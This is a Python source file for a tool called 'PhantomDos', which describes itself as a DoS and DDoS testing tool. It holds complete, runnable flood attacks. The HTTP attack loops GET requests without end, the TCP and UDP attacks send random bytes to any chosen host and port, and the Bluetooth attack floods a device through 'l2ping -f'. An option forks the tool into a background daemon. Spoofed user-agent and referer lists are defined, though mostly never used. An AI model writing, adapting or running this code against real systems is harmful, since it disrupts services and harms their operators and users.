
import re
import socket
import getopt
import sys,os,time,random,urllib
 
if sys.version_info[0] >= 3:
    import http.client as httplib
    from urllib.parse import urlparse
else:
    import httplib
    from urlparse import urlparse
def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) BlackHawk/1.0.195.0 Chrome/127.0.0.1 Safari/62439616.534')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)')
	headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0 IceDragon/26.0.0.2')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	return(headers_useragents)

# generates a referer array
def referer_list():
	global headers_referers
	headers_referers.append('http://www.google.com/?q=')                                       
	headers_referers.append('http://www.usatoday.com/search/results?q=')                       
	headers_referers.append('http://engadget.search.aol.com/search?q=')                       
	headers_referers.append('http://www.google.com/?q=')                                       
	headers_referers.append('http://www.usatoday.com/search/results?q=')                       
	headers_referers.append('http://engadget.search.aol.com/search?q=')                        
	headers_referers.append('http://www.bing.com/search?q=')                                  
	headers_referers.append('http://search.yahoo.com/search?p=')                               
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.lycos.com/web/?q=')
	headers_referers.append('http://busca.uol.com.br/web/?q=')
	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
	headers_referers.append('http://www.dmoz.org/search/search?q=')
	headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
	headers_referers.append('http://yandex.ru/yandsearch?text=')
	headers_referers.append('http://www.zhongsou.com/third?w=')
	headers_referers.append('http://hksearch.timway.com/search.php?query=')
	headers_referers.append('http://find.ezilon.com/search.php?q=')
	headers_referers.append('http://www.sogou.com/web?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')

#################################
##### Define some constants #####
#################################
 
# options
debugMode=False
consoleMode=False
useProtocol="TCP"
target=""
port=80
bluetoothMode = None
bytes_len = 256
 
########################################################################
##### daemonize: if -d param not specified, daemonize this program #####
########################################################################
 
def daemonize (stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
    '''This forks the current process into a daemon.
    The stdin, stdout, and stderr arguments are file names that
    will be opened and be used to replace the standard file descriptors
    in sys.stdin, sys.stdout, and sys.stderr.
    These arguments are optional and default to /dev/null.
    Note that stderr is opened unbuffered, so
    if it shares a file with stdout then interleaved output
    may not appear in the order that you expect.
    '''
 
    # Do first fork.
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)   # Exit first parent.
    except OSError as e:
        sys.stderr.write ("fork #1 failed: (%d) %s\n" % (e.errno, e.strerror) )
        sys.exit(1)
 
    # Decouple from parent environment.
    os.chdir("/")
    os.umask(0)
    os.setsid()
 
    # Do second fork.
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)   # Exit second parent.
    except OSError as e:
        sys.stderr.write ("fork #2 failed: (%d) %s\n" % (e.errno, e.strerror) )
        sys.exit(1)
 
    # Now I am a daemon!
 
    # Redirect standard file descriptors.
    si = open(stdin, 'r')
    so = open(stdout, 'a+')
    se = open(stderr, 'a+', 0)
    os.dup2(si.fileno(), sys.stdin.fileno())
    os.dup2(so.fileno(), sys.stdout.fileno())
    os.dup2(se.fileno(), sys.stderr.fileno())
 
############################
##### eth/wlan attacks #####
############################
 
def http_attack():
    ''' Simple HTTP attacks '''
    requests_sent = 0
    timeouts = 0
    o = urlparse(target)
    print("Starting HTTP GET flood on \""+o.netloc+":"+str(port)+o.path+"\"...")
 
    try:
        while True:
            try:
                connection = httplib.HTTPConnection(o.netloc+":"+str(port), timeout=2)
                connection.request("GET", o.path)
                requests_sent = requests_sent + 1
            except Exception as err:
               if "timed out" in err:
                   timeouts = timeouts + 1
 
    except KeyboardInterrupt:
        print("Info: Maked "+str(requests_sent)+" requests.\nTimeouts: "+str(timeouts))
 
def eth_attack():
    ''' Ethernet/Wireless attack function '''
    global log, target, debugMode, useProtocol, port
 
    if useProtocol == "HTTP":
        http_attack()
        return
 
    # number of packets for summary
    packets_sent = 0
 
    # TCP flood
    if useProtocol == "TCP":
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    else: # UDP flood
        sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) # UDP
 
    bytes=random._urandom(bytes_len)
    addr=(target,port)
 
    try:
        sock.connect(addr)
    except socket.error as e:
        print("Error: Cannot connect to destination, "+str(e))
        exit(0)
 
    sock.settimeout(None)
 
    try:
        while True:
           try:
               sock.sendto(bytes,(target,port))
               packets_sent=packets_sent+1
           except socket.error:
               if debugMode == True:
                   print("Reconnecting: ip="+str(target)+", port="+str(port)+", packets_sent="+str(packets_sent)) # propably dropped by firewall
 
               try:
                   sock.close()
                   sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                   sock.connect(addr)
               except socket.error:
                   continue
 
    except KeyboardInterrupt:
        print("Info: Sent "+str(packets_sent)+" packets.")
 
def bt_attack():
    global target, port
 
    # initialize socket
    #sock=bluetooth.BluetoothSocket( bluetooth.RFCOMM )
 
    # number of packets for summary
    #packets_sent = 0
 
    # connect
    #try:
    #    try:
    #        sock.connect((target, port))
    #    except bluetooth.btcommon.BluetoothError as (bterror):
    #        print "Error: Cannot connect using RFC to "+target+" on port "+str(port)+", "+str(bterror[0])+""
    #        exit(0)
 
     
    #    while True:
    #        packets_sent=packets_sent+1
 
            # send random data
    #        sock.send(str(random._urandom(bytes_len)))
    #except KeyboardInterrupt:
    #    print "Info: Sent "+str(packets_sent)+" packets."
    try:
        if not os.path.isfile("/usr/bin/l2ping"):
            print("Cannot find /usr/bin/l2ping, please install l2ping to use this feature.")
            sys.exit(0)
 
        sto = os.system ("/usr/bin/l2ping -f "+target+" -s "+str(bytes_len))
    except KeyboardInterrupt:
        sys.exit(0)
   
 
##########################################
##### printUsage: display short help #####
##########################################
 
def printUsage():
    ''' Prints program usage '''
 
    print("PhantomDos is in BETA 1.0 | for GNU/Linux - A Free Open DoS and DDoS testing tool @RootPhantom")
    print("Supports attacks: TCP/UDP flood, HTTP flood")
    print("")
    print("Usage: PhantomDos [option] [long GNU option]")
    print("")
    print("Valid options:")
    print("  -h, --help             : display this help")
    print("  -f, --fork             : fork to background")
    print("  -d, --debug            : switch to debug log level")
    print("  -s, --socket           : use TCP or UDP connection over ethernet/wireless, default TCP, available TCP, UDP, RFC (bluetooth), HTTP over ethernet")
    print("  -t, --target           : target adress (bluetooth mac or ip adress over ethernet/wireless)")
    print("  -p, --port             : destination port")
    print("  -b, --bytes            : number of bytes to send in one packet")
    print("")
 
try:
    opts, args = getopt.getopt(sys.argv[1:], 'hcds:b:t:p:b:', ['console','debug','help', 'socket=', 'target=', 'port=', 'bytes='])
except getopt.error as msg:
    print(msg)
    print('PhantomDos is in BETA 1.0 | for GNU/Linux - Universal DoS and DDoS testing tool @RootPhantom')
    sys.exit(2)
 
# process options
for o, a in opts:
    if o in ('-h', '--help'):
        printUsage()
        exit(2)
    if o in ('-d', '--debug'):
        debugMode=True
    if o in ('-f', '--fork'):
        daemonize()
    if o in ('-t', '--target'):
        target = a
    if o in ('-p', '--port'):
        if debugMode == True:
            print("Info: Using port "+str(a))
        try:
            port = int(a)
        except ValueError:
            print("Error: Port value is not an integer")
            exit(0)
 
    if o in ('-b', '--bytes'):
        if debugMode == True:
            print("Info: Will be sending "+str(a)+"b packets")
        try:
            bytes_len = int(a)
        except ValueError:
            print("Error: Bytes length must be numeratic")
            exit(0)
 
    if o in ('-s', '--socket'):
        bluetoothMode = False
 
        if a == "tcp" or a == "TCP":
            useProtocol = "TCP"
        elif a == "udp" or a == "UDP":
            useProtocol = "UDP"
        elif a == "RFC" or a == "rfc" or a == "BT" or a == "bt" or a == "bluetooth" or a == "BLUETOOTH":
            useProtocol = "RFC"
            bluetoothMode = True
        elif a == "http" or a == "www" or a == "HTTP" or a == "WWW":
            useProtocol = "HTTP"
 
        if debugMode == True:
            print("Info: Socket type is "+useProtocol)
 
if bluetoothMode == False:
    eth_attack()
elif bluetoothMode == None:
    print('PhantomDos is in BETA 1.0 | for GNU/Linux A Free Open DoS and DDoS testing tool, use --help for usage CODER: @RootPhantom')
else:
    #import bluetooth
    bt_attack()
